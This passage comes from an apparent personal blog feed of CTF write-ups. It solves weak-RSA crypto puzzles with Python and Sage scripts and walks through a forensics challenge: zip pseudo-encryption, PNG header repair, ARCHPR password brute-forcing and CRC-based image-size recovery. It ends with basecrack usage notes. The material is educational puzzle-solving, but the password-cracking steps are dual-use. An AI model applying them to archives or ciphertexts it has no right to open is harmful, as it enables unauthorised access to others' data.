-89127562]</span></span><br></pre></td></tr></table></figure>



<h2 id="Q-coefficients"><a href="#Q-coefficients" class="headerlink" title="Q.coefficients()"></a>Q.coefficients()</h2><blockquote>
<p>The coefficients in the polynomial Q are extracted and sorted in ascending order.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sage: x = var(&#x27;x&#x27;)</span><br><span class="line">sage: f = x^4 + 333*x^2 + 1234*x - 294832</span><br><span class="line">sage: f.coefficients()</span><br><span class="line">[[-294832, 0], [1234, 1], [333, 2], [1, 4]]</span><br><span class="line">sage: f.coefficients()[0]</span><br><span class="line">[-294832, 0]</span><br><span class="line">sage: f.coefficients()[0][0]</span><br><span class="line">-294832</span><br></pre></td></tr></table></figure>



<h2 id="g-monic"><a href="#g-monic" class="headerlink" title="g.monic()"></a>g.monic()</h2><blockquote>
<p>In algebra, the first coefficient of a polynomial is often called the leading coefficient of the polynomial, and turning a polynomial into a form with a first coefficient of 1 is called a monic form. </p>
</blockquote>
<h2 id="PolynomialRing"><a href="#PolynomialRing" class="headerlink" title="PolynomialRing?"></a>PolynomialRing?</h2><h2 id="Ideal"><a href="#Ideal" class="headerlink" title="Ideal?"></a>Ideal?</h2>]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>function</tag>
      </tags>
  </entry>
  <entry>
    <title>22-11-16-YD</title>
    <url>/2022/11/16/22-11-16-YD/</url>
    <content><![CDATA[<p>1115-YD-GAME. </p>
<p>Write Up about <strong>crypto</strong> and <strong>misc</strong>. </p>
<p>AK the crypto~ </p>
<span id="more"></span><!--toc-->

<h1 id="rrrrsa"><a href="#rrrrsa" class="headerlink" title="rrrrsa"></a>rrrrsa</h1><ul>
<li>Euler’s totient function</li>
<li>$e$ and $phi$ are not relatively-prime</li>
</ul>
<h2 id="Euler’s-totient-function"><a href="#Euler’s-totient-function" class="headerlink" title="Euler’s totient function"></a>Euler’s totient function</h2><p>Mainly use the Euler 3, which has the equation that:<br>$$<br>\varphi(p^{k}\cdot q^{r}) &#x3D; \varphi(p^{k})\cdot \varphi(q^{r})<br>$$</p>
<p>$$<br>\Longrightarrow \varphi(p) \times p^{k-1} \times \varphi(q) \times q^{r-1}<br>$$</p>
<p>$$<br>\Longrightarrow (p-1)\times p^{k-1} \times (q-1)\times q^{r-1}<br>$$</p>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">r=getPrime(<span class="number">256</span>)</span><br><span class="line">s=getPrime(<span class="number">256</span>)</span><br><span class="line">n=p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line">e=<span class="number">14</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(p,q,r,s,c,sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">82740843489176005842917905237448676902781319326096412115804401131397466993701</span></span><br><span class="line">q=<span class="number">85263643568597752465513069151877689268453731648228759206805083081972094635829</span></span><br><span class="line">r=<span class="number">79374890087283111247783732293463483039814224158289962524595401321277418666013</span></span><br><span class="line">s=<span class="number">102732199362754952069273055525350226201958416532282326662545431277468292741447</span></span><br><span class="line">c=<span class="number">209764158198100932214155089968863460960764115788843889450050526143389381127082813487813848764081174468416915862387829518066498286649325136938861327501126507330636283194491774843852097326223633337209701533553768182215060190222820102775941550334063704345167980872865539263669078518722589070762176421658193780663489275300987379291331254855029837613791180120722762611589441493216729829935815928668091245317003984177304991150484204972754604505926951762889894890977781284204135659968910559636276248002638001257927724627172934291321960032984200304503486457400466222152687435733385861015747679424548570249193669289227091923991244140876236848584520997920469772887694030202115298206597699720631193271607873611648764756487112169968220121850963271008810056644983219771177431102811348959976986368053544506721049809904407594329574573889027703243130484608315308768672733480521699846869769824733283356920305979098527936478174996930553057717113709689343835430493021845720498504798696915665856537146177480318328251379204246844497037689723120344053581795715706628542369652261282102647414868089</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = p**<span class="number">2</span>*q**<span class="number">3</span>*r**<span class="number">4</span>*s**<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">N = (p-<span class="number">1</span>)*p**(<span class="number">2</span>-<span class="number">1</span>) * (q-<span class="number">1</span>)*q**(<span class="number">3</span>-<span class="number">1</span>) * (r-<span class="number">1</span>)*r**(<span class="number">4</span>-<span class="number">1</span>) * (s-<span class="number">1</span>)*s**(<span class="number">5</span>-<span class="number">1</span>) <span class="comment"># key 1</span></span><br><span class="line">e = <span class="number">14</span></span><br><span class="line">d = invert(e//<span class="number">2</span>, N) <span class="comment"># key2-1</span></span><br><span class="line">m = iroot(powmod(c, d, n), <span class="number">2</span>)[<span class="number">0</span>] <span class="comment"># key2-2</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 46327402297749589082353363703523801418931778189802600046922737992686461676413</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;YqcbT7kcyeciLpEE3YQuRsLzJk&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h1><blockquote>
<p>Reference: [CryptoCTF2022]PolyRSA</p>
</blockquote>
<ul>
<li>Polynomial solving</li>
</ul>
<p><code>task.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genprime</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = getRandomNBitInteger(<span class="number">64</span>)</span><br><span class="line">		p = r**<span class="number">6</span> + <span class="number">8</span>*r**<span class="number">4</span> - <span class="number">41</span>*r**<span class="number">3</span> + <span class="number">14</span>*r**<span class="number">2</span> - <span class="number">116</span>*r + <span class="number">31387</span></span><br><span class="line">		q = r**<span class="number">5</span> - <span class="number">9</span>*r**<span class="number">4</span> + <span class="number">17</span>*r**<span class="number">3</span> - <span class="number">311</span>*r**<span class="number">2</span> - <span class="number">16</span>*r + <span class="number">14029</span></span><br><span class="line">		<span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">			<span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">flag, n</span>):</span><br><span class="line">	m = bytes_to_long(flag)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">pow</span>(m, <span class="number">31337</span>, n)</span><br><span class="line"></span><br><span class="line">p, q = genprime()</span><br><span class="line">n = p * q</span><br><span class="line">c = enc(flag, n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure>



<p><code>exp.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">73553176031506251642448229714220151174734540964434813056145000616720019024269982417494553771890010861489245572362590935764438928110836109730139595790550323300572059713433794357690270439325805603980903813396260703</span></span><br><span class="line">c = <span class="number">19209686331218755173713714974036153099675780768506975193406617712945126866438211292560144823093347834048813455853960982766572556698881387553177980003129346158494272297017876567974550982519632403844694686184532804</span></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Original_RSA</span>(<span class="params">p,q,e,c,n</span>):</span><br><span class="line">    N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">int</span>(invert(e, N))</span><br><span class="line">    m = powmod(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line">r = Symbol(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">p = <span class="keyword">lambda</span> r: r ** <span class="number">6</span> + <span class="number">8</span> * r ** <span class="number">4</span> - <span class="number">41</span> * r ** <span class="number">3</span> + <span class="number">14</span> * r ** <span class="number">2</span> - <span class="number">116</span> * r + <span class="number">31387</span></span><br><span class="line">q = <span class="keyword">lambda</span> r: r ** <span class="number">5</span> - <span class="number">9</span> * r ** <span class="number">4</span> + <span class="number">17</span> * r ** <span class="number">3</span> - <span class="number">311</span> * r ** <span class="number">2</span> - <span class="number">16</span> * r + <span class="number">14029</span></span><br><span class="line">n0 = p(r) * q(r)</span><br><span class="line">f = n - n0</span><br><span class="line"><span class="comment"># print(f)</span></span><br><span class="line">sol = solve([f], [r])</span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = mpz(p(x))</span><br><span class="line">q = mpz(q(x))</span><br><span class="line">m = Original_RSA(p, q, e, c, n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># 642921858775320553662877496454459277194994123046130653667709</span></span><br><span class="line"><span class="comment"># flag&#123;G3t_m0re_fuN_RSA!!!&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># or sage to solve out p, q</span></span><br><span class="line">PR.&lt;k&gt; = PolynomialRing(ZZ) <span class="comment"># define k</span></span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">n0 = p*q</span><br><span class="line"><span class="comment"># k^11 - 8*k^10 + 26*k^9 - 409*k^8 + 451*k^7 + 10850*k^6 + 44939*k^5 - 158301*k^4 + 71237*k^3 - 9651273*k^2 - 2036532*k + 439623147</span></span><br><span class="line">f = n - n0</span><br><span class="line">sol = f.roots() <span class="comment"># solve the root of the equation</span></span><br><span class="line"><span class="comment"># print(sol)</span></span><br><span class="line"><span class="comment"># [(9291098683758154336, 1)]</span></span><br><span class="line">x = sol[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br></pre></td></tr></table></figure>



<h1 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h1><blockquote>
<p>Download: <a href="ezmisc1.zip">ezmisc</a></p>
</blockquote>
<ul>
<li>Archive pseudo-encryption</li>
<li>Repair the file header</li>
<li>Extract the hidden files</li>
<li>Unzip nested packages</li>
<li>Properties area steganation &amp;&amp; Brute force</li>
<li>Blast file height or width</li>
</ul>
<h2 id="Archive-pseudo-encryption"><a href="#Archive-pseudo-encryption" class="headerlink" title="Archive pseudo-encryption"></a>Archive pseudo-encryption</h2><blockquote>
<p>Winhex</p>
</blockquote>
<p>Use winhex to find <code>504B0102</code>, and the keypoint <code>09</code> which is the 5th behind the <code>504B0102</code>. Edit it to <code>00</code> and unzip the zip. </p>
<img src="/2022/11/16/22-11-16-YD/1.jpg" class="" title="Edit and unzip">

<p> And get the output <code>1.png</code>.</p>
<h2 id="Repair-the-file-header"><a href="#Repair-the-file-header" class="headerlink" title="Repair the file header"></a>Repair the file header</h2><blockquote>
<p>Winhex</p>
</blockquote>
<p>Find the <code>1.png</code> cannot open well. Check the file header, we find that the header is <code>000000000D0A1A0A</code> which is different to <code>89504E470D0A1A0A</code>. Thus, use winhex to edit and get the real <code>1.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/1.png" class="" title="1.png">

<h2 id="Extract-the-hidden-files"><a href="#Extract-the-hidden-files" class="headerlink" title="Extract the hidden files"></a>Extract the hidden files</h2><blockquote>
<p>binwalk</p>
<p>foremost</p>
</blockquote>
<p>Use binwalk to check if there are hidden files in the picture. If yes, and we execute the foremost to get the hidden files. </p>
<p><em>Make the <strong>output</strong> file empty!</em></p>
<h2 id="Unzip-nested-packages"><a href="#Unzip-nested-packages" class="headerlink" title="Unzip nested packages"></a>Unzip nested packages</h2><blockquote>
<p>ExtractNow</p>
<p>Download: <a href="ExtractNow_V4.8.3.0.zip">ExtractNow</a></p>
</blockquote>
<p>After using the tool <code>ExtractNow</code>, we get the <code>flag.zip</code> and <code>password.zip</code> both of which are encrypted.</p>
<h2 id="Properties-area-steganation-amp-amp-Brute-force"><a href="#Properties-area-steganation-amp-amp-Brute-force" class="headerlink" title="Properties area steganation &amp;&amp; Brute force"></a>Properties area steganation &amp;&amp; Brute force</h2><blockquote>
<p>ARCHPR</p>
</blockquote>
<p>From the <code>password.zip</code> ‘s properties, we get the hint that <code>8 digits</code>. We brute the zip’s password by ARCHPR. </p>
<p>Unzip the <code>password.zip</code>, we get the <code>password.txt</code>. By this dictionary, we can also brute the <code>flag.zip</code> by ARCHPR and obtain the final picture <code>flag.png</code>.</p>
<h2 id="Blast-file-height-or-width"><a href="#Blast-file-height-or-width" class="headerlink" title="Blast file height or width"></a>Blast file height or width</h2><blockquote>
<p>stegsolve</p>
<p>python</p>
<p>winhex</p>
</blockquote>
<p>By the <code>stegsolve</code>, we can make a conclusion that the picture’s height or width has been edited from the <code>Calculated CRC</code>. </p>
<img src="/2022/11/16/22-11-16-YD/2.png" class="" title="stegsolve_check">

<p>Use a script for blasting, remember that the script has its rules. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexstr2bytes</span>(<span class="params">s</span>):</span><br><span class="line">    b = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">2</span>):</span><br><span class="line">        temp = s[i:i+<span class="number">2</span>]</span><br><span class="line">        b += struct.pack(<span class="string">&#x27;B&#x27;</span>, <span class="built_in">int</span>(temp, <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">str1 = <span class="string">&#x27;49484452&#x27;</span>   <span class="comment"># HEX/IHDR</span></span><br><span class="line">str2 = <span class="string">&#x27;0802000000&#x27;</span> <span class="comment"># Bit depth，ColorType，Compression method，Filter method，Interlace method</span></span><br><span class="line">bytes1 = hexstr2bytes(str1)</span><br><span class="line">bytes2 = hexstr2bytes(str2)</span><br><span class="line">wid, hei = <span class="number">507</span>, <span class="number">507</span>  <span class="comment"># width height</span></span><br><span class="line"></span><br><span class="line">crc32 = <span class="string">&#x27;0xe440b49a&#x27;</span> <span class="comment"># CRC32</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(wid, wid+<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(hei, hei+<span class="number">2000</span>):</span><br><span class="line">        width = <span class="built_in">hex</span>(w)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        height = <span class="built_in">hex</span>(h)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        bytes_tmp = hexstr2bytes(width+height)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="built_in">hex</span>(zlib.crc32(bytes1+bytes_tmp+bytes2))) == <span class="built_in">eval</span>(crc32):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># 0x260 0x1fb</span></span><br></pre></td></tr></table></figure>

<p>Edit the width, and we will get the true <code>flag.png</code>.</p>
<img src="/2022/11/16/22-11-16-YD/flag.png" class="" title="true_flag">

]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>euler</tag>
        <tag>polynomial</tag>
        <tag>file</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-14-Docker-Record</title>
    <url>/2022/12/14/22-12-14-docker-record/</url>
    <content><![CDATA[<p>I want to learn the docker to compile my environment. But this week   I have no time to make full studying. </p>
<p>Thus, I make a record which made by <code>Dalao-Zimablue</code>  in this post. </p>
<span id="more"></span><!--toc-->

<p><a href="https://www.zimablue.life/2022/02/10/Docker%E5%AD%A6%E4%B9%A0/#more">https://www.zimablue.life/2022/02/10/Docker%E5%AD%A6%E4%B9%A0/#more</a></p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-07-2022CnHoneKe</title>
    <url>/2022/12/07/22-12-07-2022CnHoneKe/</url>
    <content><![CDATA[<p>The competition was held in August. </p>
<p>The exercises except <code>factor2</code> are done. And the article is mainly aim to make a record for myself. The <code>Modus</code> is about the multiplicative homomorphic system, which is similar to the <code>Extended Euclidean algorithm</code>. </p>
<p><strong>List</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Modus</li>
<li><input checked="" disabled="" type="checkbox"> rsa</li>
<li><input disabled="" type="checkbox"> factor2</li>
<li><input checked="" disabled="" type="checkbox"> secret_data</li>
</ul>
<p>Wish I can solve out above. </p>
<span id="more"></span><!--toc-->

<h1 id="Modus"><a href="#Modus" class="headerlink" title="Modus"></a>Modus</h1><ul>
<li>multiplicative_homomorphic</li>
</ul>
<p><strong>output.txt</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">14142010206099386143235977555692857399310494373372334255226213043954222671886219214790080363755519983589419573494262932031062165425660149023699589427423291076757673539031113758789961660789969074666728548356143546954548237178966812807683542026090314756465049840269239582841323515153189937744280883895942616355068450477244038093783025761830910527817275117470273068582606801561816182028771714266926279491448124072638544823523354972471012076902504991756879694948477398253632905720027515230565063830199860044535605314432273647912553716877788661706091962626029470938285869557993283863813783012548154763397158585969860496209</span></span><br><span class="line">e1 = <span class="number">8044170206501208651566242545498471362911890649958881015968520025930186294576023443506808099677296038797758573489705294289102108150592764180571398770862282775413964383616485564171756065468610971753771700993772575426420613330938626182989999507422559869431997096499661057456703567386749182728255894961711</span></span><br><span class="line">c1 = <span class="number">11517322714245526592044873592382373283428914348422645739336159016405003731268657488015847458779166523731678788259036486197351408324218938844963108776390284845014868126098529982171539875948326597563481747612010865265679909207769244324752454968172401384300433252342047155447253514663020084257315172025978213587941036806257025876560069777775117798912056950800470305039358493009376541529192357082470617915062674822440632959240104574498373020678875137349967659371746447815516349204225897744273956308472359601558104152900628002351072193856499370256139818744736463310402972428459727204523498170929275318085749369313370330104</span></span><br><span class="line">e2 = <span class="number">7981110843177277522743262582712207767500318326009118362192817529414323700650435360291001887232564132664914694220334201133850645107707193720930288877874115700468049318771691746592219604611120450612600603061311788240065247605723819417162805390035814213048743243801428908542140081097421519822132590047533</span></span><br><span class="line">c2 = <span class="number">12907231513900923422005862146378905589636791955213455533815625546155661275692081099543894853443339737652933422555561840945917851059973294781475696342510739464313686827430856742266071924616860913810640580296234473777303348248031669837803543965896443694327322478656672147536068477193332582821244877632320706358476947499828283809012293724747791713411303065091158644428874828519807586496004634361827049528190857803358038226873772036022804215684911051370929474550764142943510840488678370689581686370179457811111602201500802245275266633124851078915997894235280935026230159846619929979668248511374747926732890795947582868735</span></span><br><span class="line">e3 = <span class="number">8321945773137532897701269832287423438330975369722946793416731752574708023263908693097168458920645511451157398450278461406044452962800707032660103849647429968263806321843635237930345258217128805872313308435747131438472827261934005675575066641207582827978944766548998867180054428477087525524476746729443</span></span><br><span class="line">c3 = <span class="number">14065425026445215199826296511184881258323064633386950509660192854866326626040354040592178906620984652169865998063876885421774133239148395916412178848784041317916589243316140373118461629430419305769180856968279675982734449182890302977853892881391084830333333875116598959777525928574769839174695101654696531535920235825780434207646161363349309470260223615977113109458426965856166705879375711518022880712089324008258280991081209228374850515248942548172463741894540420262751207821783524890116559086561517224038086473047623408064157594299815732082781632190258405091440187576055868450259807171733509904666142689629066721239</span></span><br></pre></td></tr></table></figure>



<p><strong>Analyse</strong></p>
<p>When I see the <code>output.txt</code>, the first thing appeared in my mind is the <code>SameModAttack</code>, using the <code>Extended-Extended Euclidean algorithm</code>. :) </p>
<p>Obviously it is wrong, and the correct solution is to use the <code>multiplicative homomorphic properties</code>. </p>
<p>From the <code>output</code>, we can get a condition that <code>gcd(e1, e2, e3) = 1</code>. Using the <code>Extended Euclidean algorithm</code> we can get $gcdext(a, b) \Longrightarrow gcd(a, b) &#x3D; r * a + s * b$. </p>
<p>By deduction, we will get the relation that:<br>$$<br>gcd(e1, e2) \equiv e1 * r1 + e2 * s1<br>$$</p>
<p>$$<br>gcd(gcd(e1, e2), e3) \equiv gcd(e1, e2) * r2 + e3 * s2<br>$$</p>
<p>$$<br>\Longrightarrow 1 \equiv (e1 * r1 + e2 * s1) * r2 + e3 * s2<br>$$</p>
<p>Using this important equation, we can deduce the plaintext:<br>$$<br>c1^{r1 \cdot r2} * c2^{r2 \cdot s1} * c3^{s3} \mod n<br>$$</p>
<p>$$<br>\Longrightarrow m^{e1\cdot r1 \cdot r2 + e2 \cdot r2 \cdot s1 + e3 \cdot s2} \equiv m \mod n<br>$$</p>
<p>And we can solve out the important <code>m</code>.</p>
<p><strong>exp.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">g1, r1, s1 = gcdext(e1, e2)</span><br><span class="line">g2, r2, s2 = gcdext(g1, e3)</span><br><span class="line"><span class="built_in">print</span>(g2)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">m = powmod(c1, r1*r2, n)*powmod(c2, r2*s1, n)*powmod(c3, s2, n) % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 158364088221424626103916028957988006099747465255174624548375855659785449250446255975244653061928080738353296765</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment"># CnHongKe&#123;e4d0e72e-7589-46a5-973a-cb2a561ab9b5&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><ul>
<li>Euler function 2</li>
<li>fermat factor</li>
</ul>
<p><strong>task.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1 * p2 * q1 * q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n = %s&quot;</span> % <span class="built_in">str</span>(n)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c = %s&quot;</span> % <span class="built_in">str</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 64167976067579049714960625453369319623574147507612434283986049223337768780480307767872484679214997588434480836733456745370562072077109044069294552424055163225824033286416753073591864962033181307822913035174676405849974928866646899569297852568167037383571518655075260561571463850326020102574832776970253538663</span></span><br><span class="line"><span class="comment"># c = 61862798948167945139222097835309318688214053098609025632041946354708220281670731577734398373186075525909035569024535800893559811995294302363408878574730352951360726686941143742759917076156204564133401228995322937563878389120770732315714920284214472911769619065607001763986611359218449802649142381309774537696</span></span><br></pre></td></tr></table></figure>



<p><strong>Analyse</strong></p>
<p>From the code, we can make a conclusion that the <code>p1</code> and <code>p2</code> are primes which are neighbors, and the <code>q1</code> and <code>q2</code> are the same. </p>
<p>At this time, we can use <code>fermat factor</code> to solve out the different <code>p1</code>, <code>p2</code>, <code>q1</code> and <code>q2</code>. </p>
<p>The <code>n</code>  is <code>Composite number</code> , so we will use <code>Euler function 2</code> to solve out $\varphi(n)$. </p>
<p>We use <code>fermat factor</code> to make a possible list and make sure that the <code>n = p1 * p2 * q1 * q2</code></p>
<h1 id="factor2"><a href="#factor2" class="headerlink" title="factor2"></a>factor2</h1><h1 id="secret-data"><a href="#secret-data" class="headerlink" title="secret_data"></a>secret_data</h1><ul>
<li>change and fix the data</li>
<li>convert data to zip</li>
<li>zip to xlsx</li>
<li>kali-grep to find the flag</li>
</ul>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>cnhongke</tag>
        <tag>multiplicative_homomorphic</tag>
        <tag>euclidean</tag>
      </tags>
  </entry>
  <entry>
    <title>22-12-19-Basecrack</title>
    <url>/2022/12/19/22-12-19-basecrack/</url>
    <content><![CDATA[<p>The guidance to install the <code>basecrack</code>.</p>
<span id="more"></span><!--toc-->

<h1 id="INSTALL"><a href="#INSTALL" class="headerlink" title="INSTALL"></a>INSTALL</h1><blockquote>
<p><a href="https://github.com/mufeedvh/basecrack/">https://github.com/mufeedvh/basecrack/</a></p>
</blockquote>
<ul>
<li>git clone <a href="https://github.com/mufeedvh/basecrack.git">https://github.com/mufeedvh/basecrack.git</a></li>
<li>cd basecrack</li>
<li>pip3 install -r requirements.txt</li>
<li>python3 basecrack.py -h</li>
</ul>
<p><em>python2 may get error</em></p>
<h2 id="Support"><a href="#Support" class="headerlink" title="Support"></a>Support</h2><p>Recently: </p>
<ul>
<li>Base16</li>
<li>Base32</li>
<li>Base36</li>
<li>Base58</li>
<li>Base62</li>
<li>Base64</li>
<li>Base64Url</li>
<li>Base85</li>
<li>Ascii85</li>
<li>Base91</li>
<li>Base92</li>
<li>Base100</li>
</ul>
<h1 id="USAGE"><a href="#USAGE" class="headerlink" title="USAGE"></a>USAGE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usage: basecrack.py [-h] [-b BASE] [-f FILE] [-m] [-i IMAGE] [-c] [-e] [-o OUTPUT]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -b BASE, --base BASE  Decode a single encoded base <span class="keyword">from</span> argument.</span><br><span class="line">  -f FILE, --file FILE  Decode multiple encoded bases <span class="keyword">from</span> a file.</span><br><span class="line">  -m, --magic           Decode multi-encoded bases <span class="keyword">in</span> one shot.</span><br><span class="line">  -i IMAGE, --image IMAGE</span><br><span class="line">                        Decode base encodings <span class="keyword">from</span> image <span class="keyword">with</span> OCR detection <span class="keyword">or</span> EXIF data.</span><br><span class="line">  -c, --ocr             OCR detection mode.</span><br><span class="line">  -e, --exif            EXIF data detection mode. (default)</span><br><span class="line">  -o OUTPUT, --output OUTPUT</span><br><span class="line">                        Generate a wordlist/output <span class="keyword">with</span> the decoded bases, enter filename</span><br><span class="line">                        <span class="keyword">as</span> the value.</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="EXAMPLE"><a href="#EXAMPLE" class="headerlink" title="EXAMPLE"></a>EXAMPLE</h1><p><a href="base.txt">base</a></p>
<blockquote>
<p>The <code>base.txt</code> is a muti-base, which use base32-&gt;base64-&gt;base64-&gt;base32-&gt;base92-&gt;base100. </p>
</blockquote>
<p>The <code>basecrack</code> now supports the base100. And we can  use the command to solve the problem. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 basecrack.py -f <span class="string">&quot;xxx/base.txt&quot;</span> -m</span><br><span class="line"><span class="comment"># if is just a ciphertext</span></span><br><span class="line"><span class="comment"># python3 basecrack.py -b &quot;ciphertext&quot;</span></span><br></pre></td></tr></table></figure>

<p>The main output: </p>
